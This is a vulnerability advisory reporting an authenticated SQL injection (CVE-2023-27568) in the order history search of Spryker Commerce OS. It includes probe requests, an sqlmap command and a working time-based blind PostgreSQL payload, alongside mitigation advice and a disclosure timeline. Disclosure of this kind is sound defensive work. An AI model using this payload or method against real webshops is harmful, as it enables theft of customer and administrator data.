@@ -1,0 +1,297 @@
+id: 38675
+date: 05/09/2023
+title: Spryker Commerce OS 1.0 SQL Injection Vulnerability
+author: David Brown
+cves: CVE-2023-27568
+
+Title
+=====
+
+SCHUTZWERK-SA-2023-001: SQL Injection in Spryker Commerce OS
+
+Status
+======
+
+PUBLISHED
+
+Version
+=======
+
+1.0
+
+CVE reference
+=============
+
+CVE-2023-27568
+
+Link
+====
+
+https://www.schutzwerk.com/advisories/schutzwerk-sa-2023-001/
+
+Text-only version:
+https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-001.txt
+
+Affected products/vendor
+========================
+
+Spryker Commerce OS by Spryker Systems GmbH, with spryker/sales: 
+11.16.0-11.36.1
+or spryker-feature/order-management: 202009.0-202212.0
+
+Summary
+=======
+
+An SQL injection vulnerability affecting Spryker-based webshops was 
+discovered
+in the order history search form. It can be exploited by authenticated
+attackers in order to retrieve informationen from the database (e.g. 
+customer
+and administrator login information, order details, etc.). Depending on the
+configuration of the webshop, access to the file system or even execution of
+arbitrary commands on the database management system is possible.
+
+Risk
+====
+
+Attackers with valid credentials for Spryker-based webshops are able to 
+exploit
+an SQL injection vulnerability in the order history search form. This allows
+full access to the application’s database and the data stored within it. 
+This
+database will generally contain -- among other information -- personally
+identifiable information. Disclosure of such data could lead to reputation
+damage for the webshop's owner. In addition, the vulnerability might 
+also pose
+legal risks regarding General Data Protection Regulation (GDPR).
+
+Depending on the configured authentication methods, the database will also
+contain login information of customers and administrators. 
+Administrative login
+information (i.e. username and password hash) could enable attackers to 
+extend
+their privileges and access the shop's backend, where administrative actions
+can be performed. In combination with the vulnerability described in
+SCHUTZWERK-SA-2022-003/CVE-2022-28888 [1], remote command execution 
+could also
+be feasible from this position if access to the required environment 
+variables
+is possible. The login information of customers could be abused by 
+attackers,
+for example if credentials are re-used across different services.
+
+Depending on the DBMS (database management system) in use, write access 
+to the
+database could theoretically also be possible. In this case, attackers can
+create new users and grant them administrative privileges, again 
+allowing for
+privilege escalation. Also, once more depending on the DBMS, reading and
+writing files on the file system of the DBMS or even direct execution of
+arbitrary system commands could be possible.
+
+The vulnerability can be easily detected, even through automated 
+scanners, and
+trivially exploited using tools such as sqlmap [2].
+
+Description
+===========
+
+Structured Query Language, abbreviated as SQL, is a standardized programming
+language for managing data held in a relational database management 
+system and
+performing various operations on the data stored in them. SQL injection
+vulnerabilities occur when attacker-controlled data is embedded unchecked in
+SQL queries. Such vulnerabilities allow attackers to bypass restrictions 
+in the
+application logic and issue manipulated queries to the database server.
+Depending on various factors (database management system used, database user
+permissions, etc.), it may be possible to read, modify and delete data and
+compromise the database or application server.
+
+The Spryker-based webshop examined as part of a customer assessment 
+offers an
+order history with a list of orders that have been placed in the past. While
+testing this function, it was observed that a server-side error 
+condition was
+triggered when a single quotation mark (') was placed in the search term 
+field.
+The HTTP request that triggered this error condition is the following
+(URL-decoded and shortened for increased readability):
+
+GET 
+/de/customer/order?orderSearchForm[searchType]=all&orderSearchForm[searchText]='&
+orderSearchForm[filters][dateFrom]=&orderSearchForm[filters][dateTo]=&
+orderSearchForm[filters][company]=company&buttonSubmit=&orderSearchForm[orderBy]=&
+orderSearchForm[orderDirection]=&orderSearchForm[reset]=&
+orderSearchForm[_token]=xX3z_M8hyyBli5XVaGhYomNbQQrc4vyBZxr0oM6bu_A HTTP/1.1
+Host: <redacted>
+Cookie: <redacted>
+[...]
+
+If the search term is instead comprised of two single quotation marks, the
+server does not return an error message and successfully completes the 
+search
+operation:
+
+GET 
+/de/customer/order?orderSearchForm[searchType]=all&orderSearchForm[searchText]=''&
+orderSearchForm[filters][dateFrom]=&orderSearchForm[filters][dateTo]=&
+orderSearchForm[filters][company]=company&buttonSubmit=&orderSearchForm[orderBy]=&
+orderSearchForm[orderDirection]=&orderSearchForm[reset]=&
+orderSearchForm[_token]=xX3z_M8hyyBli5XVaGhYomNbQQrc4vyBZxr0oM6bu_A HTTP/1.1
+Host: <redacted>
+Cookie: <redacted>
+[...]
+
+This behavior with respect to the single quotation mark is often an 
+indicator
+of SQL injection vulnerabilities. As a next step, the sqlmap [2] utility was
+used to partly automate the verification and exploitation phase:
+
+% cat search.req
+GET 
+/de/customer/order?orderSearchForm%5BsearchType%5D=all&orderSearchForm%5BsearchText%5D=test*
+&orderSearchForm%5Bfilters%5D%5BdateFrom%5D=&orderSearchForm%5Bfilters%5D%5BdateTo%5D=&
+orderSearchForm%5Bfilters%5D%5Bcompany%5D=company&buttonSubmit=&orderSearchForm%5BorderBy%5D=&
+orderSearchForm%5BorderDirection%5D=&orderSearchForm%5Breset%5D=&
+orderSearchForm%5B_token%5D=xX3z_M8hyyBli5XVaGhYomNbQQrc4vyBZxr0oM6bu_A 
+HTTP/1.1
+Host: <redacted>
+Cookie: <redacted>
+
+% sqlmap -r search.req --force-ssl --current-db
+[...]
+[10:37:12] [INFO] parsing HTTP request from 'search.req'
+custom injection marker ('*') found in option '-u'. Do you want to 
+process it? [Y/n/q]
+[10:37:12] [INFO] testing connection to the target URL
+[...]
+Parameter: #1* (URI)
+Type: time-based blind
+Title: PostgreSQL > 8.1 AND time-based blind
+Payload: 
+https://<redacted>:443/de/customer/order?orderSearchForm[searchType]
+=all&orderSearchForm[searchText]=test')) AND 2882=(SELECT 2882 FROM 
+PG_SLEEP(5)) AND
+(('yIoB'='yIoB&orderSearchForm[filters][dateFrom]=&orderSearchForm[filters][dateTo]=&
+orderSearchForm[filters][company]=company&buttonSubmit=&orderSearchForm[orderBy]=&
+orderSearchForm[orderDirection]=&orderSearchForm[reset]=&
+orderSearchForm[_token]=xX3z_M8hyyBli5XVaGhYomNbQQrc4vyBZxr0oM6bu_A
+[10:37:14] [INFO] the back-end DBMS is PostgreSQL
+back-end DBMS: PostgreSQL (CockroachDB fork)
+[10:37:14] [INFO] fetching current database
+[...]
+public
+current database (equivalent to schema on PostgreSQL): 'public'
+[...]
+
+The URL parameter orderSearchForm[searchText] was marked with an asterisk in
+the request to force sqlmap to focus on this parameter. sqlmap confirmed the
+vulnerability and successfully extracted the name of the current database as
+"public". Time-based blind SQL injection vulnerabilities are notoriously 
+slow
+to exploit. Nonetheless, it was still possible to extract the following 
+list of
+tables contained in the current database:
+
++--------------------------------------------------+
+[...]
+| spy_acl_group |
+| spy_acl_group_archive |
+| spy_acl_groups_has_roles |
+| spy_acl_role |
+| spy_acl_role_archive |
+| spy_acl_rule |
+| spy_acl_rule_archive |
+| spy_acl_user_has_group |
+| spy_auth_reset_password |
+| spy_auth_reset_password_archive |
+| spy_availability |
+| spy_availability_abstract |
+| spy_availability_storage |
+[...]
++--------------------------------------------------+
+
+Using the same method, access to the content of the different database 
+tables
+is possible.
+
+Solution/Mitigation
+===================
+
+Updated versions of the affected modules have been released by the 
+vendor and
+should be applied.
+
+In general, the following mitigation measures apply to SQL injection
+vulnerabilities:
+
+It is recommended to use so-called prepared statements with parameterized
+queries. With this mechanism, user input is strictly separated from the 
+actual
+SQL query. It is then processed only as a string and not as part of the SQL
+query. This makes it impossible for an attacker to modify the query itself.
+
+The entire code base should be audited to determine at which other endpoints
+SQL queries are generated and used. This should be followed by a 
+migration to
+prepared statements. The adaptation should be prioritized based on the risk.
+For example, the risk of successful exploitation is significantly higher 
+in the
+login screen than in an administrative function that is not visible to 
+normal
+users of the application. Accordingly, the source code of the exposed 
+functions
+should be adapted first.
+
+In some cases, parameterized queries cannot be used, for example, when 
+the data
+fields addressed by the query are dynamic. In such cases, frameworks, 
+database
+APIs, or the programming language itself provide functions that mask the 
+inputs
+appropriately so that they can be embedded in queries in a safe way. The SQL
+injection security guidelines [3] of Spryker should also be considered.
+
+Additional guidelines and recommendations regarding SQL injection are 
+provided
+in the SQL Injection Prevention Cheat Sheet [4] of OWASP.
+
+Disclosure timeline
+===================
+
+2022-11-25: Vulnerability discovered as part of assessment for customer
+2022-12-23: Vulnerablity details sent to vendor, vendor could not open 
+details
+             due to S/MIME-related issues
+2023-01-09: Vulnerability details sent to vendor in PGP-encrypted form
+2023-01-09: Vendor acknowledges receipt of report
+2023-01-12: Vendor requests additional information related to customer's
+             configuration, SCHUTZWERK provides requested information
+2023-01-13: Vendor requests additional information related to customer's
+             configuration
+2023-01-16: SCHUTZWERK provides requested information
+2023-02-16: Vendor informs SCHUTZWERK that they can reproduce the
+             vulnerability and that a fix is in progress
+2022-02-28: Vendor confirms that customers were notified about the 
+vulnerability
+2023-04-19: Vendor informed of intent to pushlish
+2023-04-20: Advisory published by SCHUTZWERK
+
+Contact/Credits
+===============
+
+The vulnerability was discovered during an assessment by David Brown of
+SCHUTZWERK GmbH.
+
+References
+==========
+
+[1] https://www.schutzwerk.com/blog/schutzwerk-sa-2022-003/
+[2] https://github.com/sqlmapproject/sqlmap
+[3] 
+https://docs.spryker.com/docs/scos/dev/guidelines/security-guidelines.html#sql-injection
+[4] 
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+
+#  0day.today [2023-05-22]  #
